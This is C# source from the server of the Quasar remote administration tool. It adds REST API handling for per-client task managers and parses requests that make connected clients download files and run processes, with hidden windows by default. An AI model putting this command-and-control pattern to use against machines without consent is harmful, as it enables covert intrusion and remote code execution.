
using Quasar.Common.Messages;
using Quasar.Server.Messages;
using Quasar.Server.Networking;
using Quasar.Server.RestApiConstants;
using System.Collections.Generic;
using System;
using System.Text.Json;

namespace Quasar.Server.RestApi
{
    public static partial class RestServer
    {
        private static readonly Dictionary<string, TaskManagerHandler> clientProcManagerHandlers = new Dictionary<string, TaskManagerHandler>();

        /// <summary>
        /// Creates a new TaskManagerHandler for the client or gets the current one, if one exists already.
        /// </summary>
        /// <param name="clientId">The ID for the client used for the TaskManagerHandler.</param>
        /// <returns>
        /// Returns a new TaskManagerHandler for the client if there is none currently available, otherwise creates a new one.
        /// </returns>
        public static TaskManagerHandler CreateNewOrGetExistingProcManagerHandler(string clientId)
        {
            if (clientProcManagerHandlers.ContainsKey(clientId))
            {
                return clientProcManagerHandlers[clientId];
            }
            Client client = mainForm.LookupClientById(clientId);
            if (client == null)
            {
                throw new Exception("Could not find connected client by ID " + clientId);
            }
            TaskManagerHandler t = new TaskManagerHandler(client, viaRestApi: true);
            MessageHandler.Register(t);
            clientProcManagerHandlers[clientId] = t;
            return t;
        }

        public static ExecuteProcessApiRequest GetExecuteProcessApiRequestFromPostDict(Dictionary<string, JsonElement> dataDict)
        {
            ExecuteProcessApiRequest ret = new ExecuteProcessApiRequest();

            // Client ID
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.CLIENT_ID_FIELD_NAME))
            {
                throw new JsonException(String.Format("Process execution task POST request did not contain required key \"{0}\"", ExecuteProcessApiRequest.CLIENT_ID_FIELD_NAME));
            }
            else
            {
                ret.ClientId = dataDict[ExecuteProcessApiRequest.CLIENT_ID_FIELD_NAME].ToString();
            }

            // Binary path
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.BINARY_PATH_FIELD_NAME))
            {
                ret.BinaryPath = "";
            }
            else
            {
                ret.BinaryPath = dataDict[ExecuteProcessApiRequest.BINARY_PATH_FIELD_NAME].ToString();
            }

            // Process args
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.PROCESS_ARGS_FIELD_NAME))
            {
                ret.ProcessArgs = "";
            }
            else
            {
                ret.ProcessArgs = dataDict[ExecuteProcessApiRequest.PROCESS_ARGS_FIELD_NAME].ToString();
            }

            // Download url
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.DOWNLOAD_URL_FIELD_NAME))
            {
                ret.DownloadUrl = "";
            }
            else
            {
                ret.DownloadUrl = dataDict[ExecuteProcessApiRequest.DOWNLOAD_URL_FIELD_NAME].ToString();
            }

            // Download dest
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.DOWNLOAD_DEST_PATH_FIELD_NAME))
            {
                ret.DownloadDestPath = "";
            }
            else
            {
                ret.DownloadDestPath = dataDict[ExecuteProcessApiRequest.DOWNLOAD_DEST_PATH_FIELD_NAME].ToString();
            }

            // Use shell execute (default false)
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.USE_SHELL_EXEC_FIELD_NAME))
            {
                ret.UseShellExecute = false;
            }
            else
            {
                ret.UseShellExecute = dataDict[ExecuteProcessApiRequest.USE_SHELL_EXEC_FIELD_NAME].GetBoolean();
            }

            // Capture output (default true)
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.CAPTURE_OUTPUT_FIELD_NAME))
            {
                ret.CaptureOutput = true;
            }
            else
            {
                ret.CaptureOutput = dataDict[ExecuteProcessApiRequest.CAPTURE_OUTPUT_FIELD_NAME].GetBoolean();
            }

            // No window (default true)
            if (!dataDict.ContainsKey(ExecuteProcessApiRequest.NO_WINDOW_FIELD_NAME))
            {
                ret.NoWindow = true;
            }
            else
            {
                ret.NoWindow = dataDict[ExecuteProcessApiRequest.NO_WINDOW_FIELD_NAME].GetBoolean();
            }
            return ret;
        }
    }
}
